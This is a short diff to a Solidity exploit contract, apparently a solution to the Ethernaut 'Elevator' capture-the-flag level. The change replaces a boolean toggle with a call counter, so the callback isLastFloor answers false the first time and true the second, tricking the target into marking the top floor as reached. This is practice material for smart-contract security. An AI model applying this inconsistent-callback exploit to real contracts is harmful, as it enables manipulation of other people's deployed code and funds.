@@ -6,8 +6,8 @@ interface IElevator {
 }
 
 contract HackElevator {
-  bool public firstFloor = false;
-  IElevator elevator;
+  uint256 timesCalled;
+  IElevator public elevator;
 
   constructor(IElevator _elevator) public {
     elevator = IElevator(_elevator);
@@ -17,14 +17,10 @@ contract HackElevator {
     elevator.goTo(0);
   }
 
-  function isLastFloor(uint) public view returns (bool) {
-    if(! firstFloor){
-      firstFloor = true;
-      return false;
-    } else {
-      firstFloor = false;
-      return true;
-    }
+  function isLastFloor(uint) external returns (bool) {
+    timesCalled++;
+    if (timesCalled > 1) return true;
+    else return false;
   }
 
 }
